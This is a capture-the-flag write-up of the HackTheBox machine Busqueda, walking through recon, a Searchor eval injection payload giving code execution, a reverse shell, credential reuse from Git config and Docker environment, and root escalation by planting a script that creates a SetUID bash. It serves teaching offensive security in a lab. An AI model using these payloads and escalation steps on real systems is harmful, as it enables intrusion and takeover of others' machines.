---
title: HTB: Busqueda
url: https://0xdf.gitlab.io/2023/08/12/htb-busqueda.html
date: 2023-08-12T13:45:00+00:00
difficulty: Easy [20]
os: Linux
tags: hackthebox, htb-busqueda, ctf, nmap, flask, ubuntu, searchor, feroxbuster, python-eval, command-injection, burp, burp-repeater, password-reuse, gitea, htb-forgot, oscp-like-v3
---

![Busqueda](/img/busqueda-cover.png)

Busqueda presents a website that gives links to various sites based on user input. Under the hood, it is using the Python Searchor command line tool, and I’ll find an unsafe eval vulnerability and exploit that to get code execution. On the host, the user can run sudo to run a Python script, but I can’t see the script. I’ll find a virtualhost with Gitea, and use that along with different creds to eventually find the source for the script, and identify how to run it to get arbitrary execution as root.

## Box Info

| Name | [Busqueda](https://hackthebox.com/machines/busqueda)  [Busqueda](https://hackthebox.com/machines/busqueda) [Play on HackTheBox](https://hackthebox.com/machines/busqueda) |
| --- | --- |
| Release Date | [08 Apr 2023](https://twitter.com/hackthebox_eu/status/1643992095366213639) |
| Retire Date | 12 Aug 2023 |
| OS | Linux Linux |
| Base Points | Easy [20] |
| Rated Difficulty | Rated difficulty for Busqueda |
| Radar Graph | Radar chart for Busqueda |
| First Blood User | 00:09:42[szymex73 szymex73](https://app.hackthebox.com/users/139466) |
| First Blood Root | 00:40:31[szymex73 szymex73](https://app.hackthebox.com/users/139466) |
| Creator | [kavigihan kavigihan](https://app.hackthebox.com/users/389926) |

## Recon

### nmap

`nmap` finds two open TCP ports, SSH (22) and HTTP (80):

```

oxdf@hacky$ nmap -p- --min-rate 10000 10.10.11.208
Starting Nmap 7.80 ( https://nmap.org ) at 2023-04-09 17:17 EDT
Nmap scan report for searcher.htb (10.10.11.208)
Host is up (0.018s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 6.05 seconds
oxdf@hacky$ nmap -p 22,80 -sCV 10.10.11.208
Starting Nmap 7.80 ( https://nmap.org ) at 2023-04-09 17:17 EDT
Nmap scan report for searcher.htb (10.10.11.208)
Host is up (0.016s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.52
| http-server-header: 
|   Apache/2.4.52 (Ubuntu)
|_  Werkzeug/2.1.2 Python/3.10.6
|_http-title: Searcher
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.45 seconds

```

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) and [Apache](https://packages.ubuntu.com/search?keywords=apache2) versions, the host is likely running Ubuntu 22.04 jammy.

The HTTP response shows a redirect to `http://searcher.htb`. Given the use of DNS / domain names, I’ll fuzz the server with `wfuzz` to look for subdomains that respond differently, but not find anything. I’ll add `searcher.htb` to my `/etc/hosts` file:

```
10.10.11.208 searcher.htb

```

### searcher.htb - TCP 80

#### Site

The site is a unified search engine that generates query URLs for a ton of different search engines:

![image-20230409171848479](/img/image-20230409171848479.png)

If I select GitHub and search for “0xdf”, it goes to `/search` which returns this URL:

![image-20230331115621596](/img/image-20230331115621596.png)

If I do the same search with “Auto redirect” checked, it redirects to that page:

![image-20230331115704742](/img/image-20230331115704742.png)

#### Tech Stack

The HTTP response headers show this is a Python application:

```

HTTP/1.1 200 OK
Date: Sun, 09 Apr 2023 21:18:07 GMT
Server: Werkzeug/2.1.2 Python/3.10.6
Content-Type: text/html; charset=utf-8
Vary: Accept-Encoding
Content-Length: 13519
Connection: close

```

Werkzeug is most commonly seem in [Flask](https://flask.palletsprojects.com/en/2.3.x/) applications. The 404 page for this application is the [default Flask 404](/2023/03/04/htb-forgot.html#tech-stack):

![image-20230331120031900](/img/image-20230331120031900.png)

It also says this is Flask at the bottom of the page:

![image-20230409171932334](/img/image-20230409171932334.png)

[Searchor](https://github.com/ArjunSharda/Searchor) is a Python package and command line tool that allows for easily searching and web scraping, which is clearly what’s being used to generate the URLs.

#### Directory Brute Force

I’ll run `feroxbuster` against the site, and it finds only the `/search` path that I already know about:

```

oxdf@hacky$ feroxbuster -u http://searcher.htb

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.9.2
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://searcher.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /opt/SecLists/Discovery/Web-Content/raft-small-words.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.9.2
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        5l       31w      207c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
405      GET        5l       20w      153c http://searcher.htb/search
200      GET      430l      751w    13518c http://searcher.htb/
403      GET        9l       28w      277c http://searcher.htb/server-status
[####################] - 3m     43009/43009   0s      found:3       errors:19     
[####################] - 3m     43008/43008   219/s   http://searcher.htb/ 

```

`/server-status` is a standard Apache thing.

## Shell as svc

### Identify Vulnerability

On the [Searchor releases page](https://github.com/ArjunSharda/Searchor/releases), Searchor v2.4.2 says that it patches a priority vulnerability in Searcher CLI:

![image-20230331142317898](/img/image-20230331142317898.png)

The link leads to [this pull request](https://github.com/ArjunSharda/Searchor/pull/130), which says:

> ### What is this Pull Request About?
>
> The simple change in this pull request replaces the execution of `search` method in the cli code from using `eval` to calling search on the specified engine by passing `engine` as an attribute of `Engine` class. Because enum in Python is a set of members, each being a key-value pair, the syntax for getting members is the same as passing a dictionary.
>
> ### What will this Pull Request Affect?
>
> This pull request removes the use of `eval` in the cli code, achieving the same functionality while removing vulnerability of allowing execution of arbitrary code.

The “Files changed” tab shows that it’s only a small change in one file:

![image-20230331143118578](/img/image-20230331143118578.png)

The use of `click` makes sense since the vulnerability is in the command line application, and [click](https://click.palletsprojects.com/en/8.1.x/) is a Python library for making command line applications.

### Install Locally

#### Virtual Env

This seems like it would be a trivial injection at this point, but getting it working is tricky. Part of that is because it doesn’t make a lot of sense that the box would be using the Searchor CLI when it is a Python web application, and could just use the library to generate these URLs.

That said, if Busqueda is vulnerable to this bug, then it must be in the CLI. I’ll install the CLI, but first make a Python virtual environment:

```

oxdf@hacky$ python -m venv venv
oxdf@hacky$ source venv/bin/activate
(venv) oxdf@hacky$

```

The first line creates the environment, and the second activates it, setting paths and environment variables such that when I try to run things like Python or install packages, they go into that virtual env. This allows me to work in a clean Python environment, and to mess with the files without impacting my host configuration. Then when I’m done with it, I’ll just `rm -rf venv` and it’s all gone.

I’ll install this version of Searchor into the venv:

```

(venv) oxdf@hacky$ pip install searchor==2.4.0
Collecting searchor==2.4.0
  Downloading searchor-2.4.0-py3-none-any.whl (8.0 kB)
Collecting pyperclip
  Downloading pyperclip-1.8.2.tar.gz (20 kB)
  Preparing metadata (setup.py) ... done
Collecting aenum
  Downloading aenum-3.1.12-py3-none-any.whl (131 kB)
     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 131.8/131.8 kB 5.2 MB/s eta 0:00:00
Collecting click
  Using cached click-8.1.3-py3-none-any.whl (96 kB)
Installing collected packages: pyperclip, aenum, click, searchor
  DEPRECATION: pyperclip is being installed using the legacy 'setup.py install' method, because it does not have a 'pyproject.toml' and the 'wheel' package is not installed. pip 23.1 will enforce this behaviour change. A possible replacement is to enable the '--use-pep517' option. Discussion can be found at https://github.com/pypa/pip/issues/8559
  Running setup.py install for pyperclip ... done
Successfully installed aenum-3.1.12 click-8.1.3 pyperclip-1.8.2 searchor-2.4.0

```

Now if I look for the path to `searchor`, it’s in the `venv` folder:

```

(venv) oxdf@hacky$ which searchor 
/tmp/venv/bin/searchor

```

#### Understand Tool

Running `searchor` shows it has two commands, `history` and `search`:

```

(venv) oxdf@hacky$ searchor 
Usage: searchor [OPTIONS] COMMAND [ARGS]...

Options:
  --help  Show this message and exit.

Commands:
  history
  search

```

The pull request showed the change was in the `search` command. `--help` shows the syntax:

```

(venv) oxdf@hacky$ searchor search --help
Usage: searchor search [OPTIONS] ENGINE QUERY

Options:
  -o, --open  Opens your web browser to the generated link address
  -c, --copy  Copies the generated link address to your clipboard
  --help      Show this message and exit.

```

#### Local POC

I’m trying to inject into this code, where I control `engine` and `query`:

```

url = eval(
    f"Engine.{engine}.search('{query}', copy_url={copy}, open_web={open})"
)

```

If I target `engine`, it’s likely to error out, and I won’t get a result back, so I’ll focus on `query`. If I give it a single quote, it crashes:

```

(venv) oxdf@hacky$ searchor search GitHub 0xdf
https://www.github.com/search?q=0xdf
(venv) oxdf@hacky$ searchor search GitHub "0xdf'"
Traceback (most recent call last):
  File "/tmp/venv/bin/searchor", line 8, in <module>
    sys.exit(cli())
             ^^^^^
...[snip]...
  File "/tmp/venv/lib/python3.11/site-packages/searchor/main.py", line 32, in search
    url = eval(
          ^^^^^
  File "<string>", line 1
    Engine.GitHub.search('0xdf'', copy_url=False, open_web=False)
                               ^
SyntaxError: unterminated string literal (detected at line 1)

```

I need to make that syntax correct. A bit of trial and error gets me to something like:

```

' + __import__('os').popen('id').read() + '

```

If I submit that as the `search`, that the code will look like:

```

f"Engine.GitHub.search('' + __import__('os').popen('id').read() + '', copy_url={copy}, open_web={open})"

```

It works:

```

(venv) oxdf@hacky$ searchor search GitHub "' + __import__('os').popen('id').read() + '"
https://www.github.com/search?q=uid%3D1000%28oxdf%29%20gid%3D1000%28oxdf%29%20groups%3D1000%28oxdf%29%2C115%28netdev%29%2C123%28nopasswdlogin%29%2C999%28vboxsf%29%0A

```

The result is URL-encoded, but decoding that gives, which is the output of the `id` command:

```

https://www.github.com/search?q=uid=1000(oxdf) gid=1000(oxdf) groups=1000(oxdf),115(netdev),123(nopasswdlogin),999(vboxsf)

```

### RCE

#### POC

I’ll try submitting that payload by finding the POST request in Burp Proxy, and sending that request to Burp Repeater. There, I’ll edit the `query` to be my parameter:

![image-20230331145602239](/img/image-20230331145602239.png)

Once it’s there, I’ll want to URL encode it by selecting everything between my `'` and pushing Ctrl-u. Clicking “Send” shows success:

![image-20230331145706180](/img/image-20230331145706180.png)

If I select the response and push Ctrl-Shift-u, the URL decoded text pops up:

![image-20230331145749192](/img/image-20230331145749192.png)

#### Shell

Still in Repeater, I’ll replace `id` with a [bash reverse shell](https://www.youtube.com/watch?v=OjkVep2EIlw):

![image-20230331150452775](/img/image-20230331150452775.png)

I’ll need to select the new stuff and Ctrl-u to URL encode it:

![image-20230331150513958](/img/image-20230331150513958.png)

It is important to be careful about what is getting URL encoded. `+` becomes `%2b`, but space becomes `+`. It’s important that every be encoded only once.

I’ll start `nc` listening on 443 and send the request:

```

oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.208 46054
bash: cannot set terminal process group (1625): Inappropriate ioctl for device
bash: no job control in this shell
svc@busqueda:/var/www/app$

```

I’ll do the standard [shell upgrade](https://www.youtube.com/watch?v=DqE6DxqJg8Q):

```

svc@busqueda:/root$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
svc@busqueda:/root$ ^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@hacky$ stty raw -echo; fg
nc -lnvp 443
            reset
svc@busqueda:/root$ 

```

And grab `user.txt` from svc’s home directory:

```

svc@busqueda:~$ cat user.txt
ba1f2511************************

```

## Shell as root

### Enumeration

#### Home Directory

svc is the only user with a home directory in `/home`. The directory is pretty empty, but the `.gitconfig` file is interesting:

```

svc@busqueda:~$ ls -la
total 48
drwxr-x--- 6 svc  svc  4096 Apr  8 21:09 .
drwxr-xr-x 3 root root 4096 Dec 22 18:56 ..
lrwxrwxrwx 1 root root    9 Feb 20 12:08 .bash_history -> /dev/null
-rw-r--r-- 1 svc  svc   220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 svc  svc  3771 Jan  6  2022 .bashrc
drwx------ 2 svc  svc  4096 Feb 28 11:37 .cache
-rw-rw-r-- 1 svc  svc    76 Apr  3 08:58 .gitconfig
drwx------ 3 svc  svc  4096 Apr  8 20:26 .gnupg
drwxrwxr-x 5 svc  svc  4096 Jun 15  2022 .local
lrwxrwxrwx 1 root root    9 Apr  3 08:58 .mysql_history -> /dev/null
-rw-r--r-- 1 svc  svc   807 Jan  6  2022 .profile
lrwxrwxrwx 1 root root    9 Feb 20 14:08 .searchor-history.json -> /dev/null
drwx------ 3 svc  svc  4096 Apr  8 20:25 snap
-rw-r----- 1 root svc    33 Apr  6 16:56 user.txt
-rw------- 1 svc  svc  1901 Apr  8 21:09 .viminfo
svc@busqueda:~$ cat .gitconfig 
[user]
        email = cody@searcher.htb
        name = cody
[core]
        hooksPath = no-hooks

```

The svc user’s name is cody.

#### Web

The web code is located in `/var/www/app`:

```

svc@busqueda:/var/www/app$ ls -la
total 20
drwxr-xr-x 4 www-data www-data 4096 Apr  3 14:32 .
drwxr-xr-x 4 root     root     4096 Apr  4 16:02 ..
-rw-r--r-- 1 www-data www-data 1124 Dec  1 14:22 app.py
drwxr-xr-x 8 www-data www-data 4096 Apr  8 19:00 .git
drwxr-xr-x 2 www-data www-data 4096 Dec  1 14:35 templates

```

The `.git` folder suggests this application is managed via Git. The config is interesting:

```

svc@busqueda:/var/www/app$ cat .git/config 
[core]
        repositoryformatversion = 0
        filemode = true
        bare = false
        logallrefupdates = true
[remote "origin"]
        url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
        fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
        remote = origin
        merge = refs/heads/main

```

There’s a reference to `gitea.searcher.htb`, and creds for the cody user.

#### Gitea

I’ll update my `/etc/hosts` file and check out `gitea.searcher.htb`:

![image-20230331151821858](/img/image-20230331151821858.png)
[![expand](/icons/expand.png)](javascript:void(0) "Click to expand for full content")

It is a Gitea instance, and cody’s creds work:

![image-20230331151914487](/img/image-20230331151914487.png)

The code for the site is here, but nothing too interesting.

#### sudo

Running `sudo` requests a password:

```

svc@busqueda:~$ sudo -l
[sudo] password for svc:

```

Knowing that svc is cody, I’ll try cody’s Gitea password, and it works:

```

svc@busqueda:~$ sudo -l
[sudo] password for svc: 
Matching Defaults entries for svc on busqueda:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User svc may run the following commands on busqueda:
    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *

```

The permissions on this file are such that svc can’t read it, and can’t even execute it (in order to execute a script with an interpreter like Python, it must have read; an ELF binary would work fine this way):

```

svc@busqueda:~$ ls -l /opt/scripts/system-checkup.py 
-rwx--x--x 1 root root 1903 Jan  7 09:18 /opt/scripts/system-checkup.py

```

#### system-checkup

Because of the `*` at the end of the `sudo` line, I can’t run it without args:

```

svc@busqueda:~$ sudo python3 /opt/scripts/system-checkup.py 
Sorry, user svc is not allowed to execute '/usr/bin/python3 /opt/scripts/system-checkup.py' as root on busqueda.

```

I’ll try with “0xdf” on the end:

```

svc@busqueda:~$ sudo python3 /opt/scripts/system-checkup.py 0xdf
Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)

     docker-ps     : List running docker containers
     docker-inspect : Inpect a certain docker container
     full-checkup  : Run a full system checkup

```

There are three functions. `docker-ps` prints the output of what looks like the `docker ps` command:

```

svc@busqueda:~$ sudo python3 /opt/scripts/system-checkup.py docker-ps
CONTAINER ID   IMAGE                COMMAND                  CREATED        STATUS       PORTS                                             NAMES
960873171e2e   gitea/gitea:latest   "/usr/bin/entrypoint…"   2 months ago   Up 4 hours   127.0.0.1:3000->3000/tcp, 127.0.0.1:222->22/tcp   gitea
f84a6b33fb5a   mysql:8              "docker-entrypoint.s…"   2 months ago   Up 4 hours   127.0.0.1:3306->3306/tcp, 33060/tcp               mysql_db

```

There are two containers running.

`docker-inspect` wants a format and a container name:

```

svc@busqueda:~$ sudo python3 /opt/scripts/system-checkup.py docker-inspect
Usage: /opt/scripts/system-checkup.py docker-inspect <format> <container_name>

```

The `docker inspect` command takes a container and [the docs](https://docs.docker.com/engine/reference/commandline/inspect/) show a `--format` option. This allows for selecting parts of the result. [This page of docs](https://docs.docker.com/config/formatting/) shows how the format works. If I pass it `{{ json [selector]}}` then whatever I give in selector will pick what displays. If I just give it `.` as the `selector`, it displays everything, which I’ll pipe into `jq` to pretty print:

```

svc@busqueda:~$ sudo python3 /opt/scripts/system-checkup.py docker-inspect '{{json .}}' gitea | jq .
{                                                         
  "Id": "960873171e2e2058f2ac106ea9bfe5d7c737e8ebd358a39d2dd91548afd0ddeb",
  "Created": "2023-01-06T17:26:54.457090149Z",
  "Path": "/usr/bin/entrypoint",                          
  "Args": [
    "/bin/s6-svscan",
    "/etc/s6"
  ],  
...[snip]...
    "Env": [
      "USER_UID=115",
      "USER_GID=121",
      "GITEA__database__DB_TYPE=mysql",
      "GITEA__database__HOST=db:3306",
      "GITEA__database__NAME=gitea",
      "GITEA__database__USER=gitea",
      "GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh",
      "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
      "USER=git",
      "GITEA_CUSTOM=/data/gitea"                          
    ],  
...[snip]...

```

The environment section has the connection info for the DB, and there’s a password.

The last option is `full-checkup`, but it just errors:

```

svc@busqueda:~$ sudo python3 /opt/scripts/system-checkup.py full-checkup
Something went wrong

```

#### DB

I’ll get the IP of the database by running the `system-checkup.py` script on the `mysql_db` container:

```

svc@busqueda:~$ sudo python3 /opt/scripts/system-checkup.py docker-inspect '{{json .NetworkSettings.Networks}}' mysql_db | jq .
{
  "docker_gitea": {
    "IPAMConfig": null,
    "Links": null,
    "Aliases": [
      "f84a6b33fb5a",
      "db"
    ],
    "NetworkID": "cbf2c5ce8e95a3b760af27c64eb2b7cdaa71a45b2e35e6e03e2091fc14160227",
    "EndpointID": "4d843a366dbaece32f09158e28a9f41d0a94cf2892455102e2800dcc445e9561",
    "Gateway": "172.19.0.1",
    "IPAddress": "172.19.0.3",
    "IPPrefixLen": 16,
    "IPv6Gateway": "",
    "GlobalIPv6Address": "",
    "GlobalIPv6PrefixLen": 0,
    "MacAddress": "02:42:ac:13:00:03",
    "DriverOpts": null
  }
}

```

I’ll connect to the DB:

```

svc@busqueda:~$ mysql -h 172.19.0.3 -u gitea -pyuiu1hoiu4i5ho1uh gitea
...[snip]...
mysql>

```

`gitea` is the only interesting db:

```

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| gitea              |
| information_schema |
| performance_schema |
+--------------------+
3 rows in set (0.00 sec)

```

I’ll check out the `user` table:

```

mysql> select name,email,passwd from user;
+---------------+----------------------------------+------------------------------------------------------------------------------------------------------+
| name          | email                            | passwd                                                                                               |
+---------------+----------------------------------+------------------------------------------------------------------------------------------------------+
| administrator | administrator@gitea.searcher.htb | ba598d99c2202491d36ecf13d5c28b74e2738b07286edc7388a2fc870196f6c4da6565ad9ff68b1d28a31eeedb1554b5dcc2 |
| cody          | cody@gitea.searcher.htb          | b1f895e8efe070e184e5539bc5d93b362b246db67f3a2b6992f37888cb778e844c0017da8fe89dd784be35da9a337609e82e |
+---------------+----------------------------------+------------------------------------------------------------------------------------------------------+
2 rows in set (0.00 sec)

```

### Exploit system-checkup.py

#### Access Gitea as administrator

I’ve already got cody’s password. Before I try to crack the administrator’s password, I’ll see if it is reused from the database? Trying to log in with administrator / “yuiu1hoiu4i5ho1uh” works!

Administrator has one private repo named “scripts”:

![image-20230409172927468](/img/image-20230409172927468.png)

`system-checkup.py` is in that repo:

![image-20230409172949079](/img/image-20230409172949079.png)

#### system-checkup.py Source Analysis

The script is relatively simple. It has three sections, one of which gets called based on the command given. There is a `run_command` function that uses `subprocess.run` to run system commands in a safe way. This is not command injectable.

`docker-ps` and `docker-inspect` both use `run_command` to run `docker ps` and `docker inspect` just like I would have guessed.

`full-checkup` is where it is interesting:

```

    elif action == 'full-checkup':
        try:
            arg_list = ['./full-checkup.sh']
            print(run_command(arg_list))
            print('[+] Done!')
        except:
            print('Something went wrong')
            exit(1)

```

It is trying to run `full-checkup.sh` from the current directory. It failed before because that file didn’t exist.

#### Exploit

I can put whatever I want into a `full-checkup.sh` and it will run as root if I start `system-checkup.py full-checkup` in the same directory.

I’ll have it copy `bash` and set my copy as SetUID to run as root:

```

svc@busqueda:/dev/shm$ echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchmod 4777 /tmp/0xdf' > full-checkup.sh
svc@busqueda:/dev/shm$ cat full-checkup.sh 
#!/bin/bash

cp /bin/bash /tmp/0xdf
chmod 4777 /tmp/0xdf
svc@busqueda:/dev/shm$ chmod +x full-checkup.sh 

```

It’s important to set it as executable as well.

I’ll run `system-checkup.py` and it reports success:

```

svc@busqueda:/dev/shm$ sudo python3 /opt/scripts/system-checkup.py full-checkup

[+] Done!

```

`/tmp/0xdf` is there, owned by root, and the `s` bit is on:

```

svc@busqueda:/dev/shm$ ls -l /tmp/0xdf 
-rwsrwxrwx 1 root root 1396520 Mar 31 19:57 /tmp/0xdf

```

I’ll run with `-p` to [not drop privs](/2022/05/31/setuid-rabbithole.html):

```

svc@busqueda:/dev/shm$ /tmp/0xdf -p
0xdf-5.1#

```

And grab `root.txt`:

```

0xdf-5.1# cat root.txt
e7df7cd2************************

```